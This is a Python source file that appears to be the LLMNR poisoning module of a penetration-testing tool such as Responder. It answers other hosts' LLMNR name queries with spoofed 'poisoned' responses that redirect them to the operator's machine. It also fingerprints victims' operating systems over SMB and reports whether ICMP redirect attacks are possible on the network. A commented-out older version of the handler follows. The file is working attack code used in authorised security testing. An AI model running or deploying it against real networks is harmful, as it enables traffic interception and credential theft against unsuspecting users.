import socket
import struct
import settings
import fingerprint

from packets import LLMNR_Ans
from odict import OrderedDict
from SocketServer import BaseRequestHandler
from utils import *

def Parse_LLMNR_Name(data):
	NameLen = struct.unpack('>B',data[12])[0]
	Name = data[13:13+NameLen]
	return Name

def IsOnTheSameSubnet(ip, net):
	net = net+'/24'
	ipaddr = int(''.join([ '%02x' % int(x) for x in ip.split('.') ]), 16)
	netstr, bits = net.split('/')
	netaddr = int(''.join([ '%02x' % int(x) for x in netstr.split('.') ]), 16)
	mask = (0xffffffff << (32 - int(bits))) & 0xffffffff
	return (ipaddr & mask) == (netaddr & mask)

def IsICMPRedirectPlausible(IP):
	dnsip = []
	for line in file('/etc/resolv.conf', 'r'):
		ip = line.split()
		if len(ip) < 2:
		   continue
		if ip[0] == 'nameserver':
			dnsip.extend(ip[1:])
	for x in dnsip:
		if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
			print color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5, 0)
			print color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5, 0)
			print color("[Analyze mode: ICMP] Use python Icmp-Redirect.py for more details.", 5, 0)
		else:
			pass

def AnalyzeICMPRedirect():
	if settings.Config.Responder_IP is not None and settings.Config.Interface == 'Not set':
		IsICMPRedirectPlausible(settings.Config.Responder_IP)

	if settings.Config.Interface != 'Not set':
		IsICMPRedirectPlausible(FindLocalIP(settings.Config.Interface))

if settings.Config.AnalyzeMode:
	AnalyzeICMPRedirect()

# LLMNR Server class
class LLMNR(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		Name = Parse_LLMNR_Name(data)

		# Break out if we don't want to respond to this host
		if RespondToThisHost(self.client_address[0], Name) is not True:
			return None

		if data[2:4] == "\x00\x00" and Parse_IPV6_Addr(data):

			if settings.Config.Finger_On_Off:
				Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
			else:
				Finger = None

			# Analyze Mode
			if settings.Config.AnalyzeMode:
				Filename   = settings.Config.AnalyzeFilename
				LineHeader = "[Analyze mode: LLMNR]"
				print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)

			# Poisoning Mode
			else:
				Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
				Buffer.calculate()
				soc.sendto(str(Buffer), self.client_address)

				Filename   = settings.Config.Log2Filename
				LineHeader = "[LLMNR]"

				print color("%s Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)

			if Finger is not None:
				print text("%s [FINGER] OS Version     : %s" % (LineHeader, color(Finger[0], 3, 0)))
				print text("%s [FINGER] Client Version : %s" % (LineHeader, color(Finger[1], 3, 0)))


"""
# LLMNR Server class.
class LLMNR(BaseRequestHandler):

	def handle(self):
		data, soc = self.request
		try:
			if data[2:4] == "\x00\x00":
				if Parse_IPV6_Addr(data):
					Name = Parse_LLMNR_Name(data)
					
					if settings.Config.AnalyzeMode and settings.Config.Finger_On_Off:

						Message = "[Analyze mode: LLMNR] Host: %-15s  Request: %s." % (color(self.client_address[0], 3, 0), color(Name, 3, 0))

						if PrintLLMNRNBTNS(settings.Config.AnalyzeFilename, Message):
							print text(Message)
					
						try:
							Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
							print text("[Analyze mode: FINGER] OS: %s, Client: %s" % (color(Finger[0], 3, 0), color(Finger[1], 3, 0)))

						except Exception:
							print text("[Analyze mode: FINGER] Fingerprint failed for host %s." % color(Name, 3, 0))


					
					if settings.Config.AnalyzeMode == False:



								buff = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
								buff.calculate()
								soc.sendto(str(buff), self.client_address)
								
								Message = "[LLMNR] Poisoned answer sent to host: %-15s  Request: %s." % (color(self.client_address[0], 3, 0), color(Name, 3, 0))

								if PrintLLMNRNBTNS(settings.Config.Log2Filename, Message):
									print text(Message)
								
								if settings.Config.Finger_On_Off:
									try:
										Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
										print text('[FINGER] OS: %s, Client: %s' % (color(Finger[0], 3, 0), color(Finger[1], 3, 0)))

									except Exception:
										print text('[FINGER] Fingerprint failed for host: %s' % color(Name, 3, 0))
										pass
					

			else:
				pass
		except:
			raise
"""
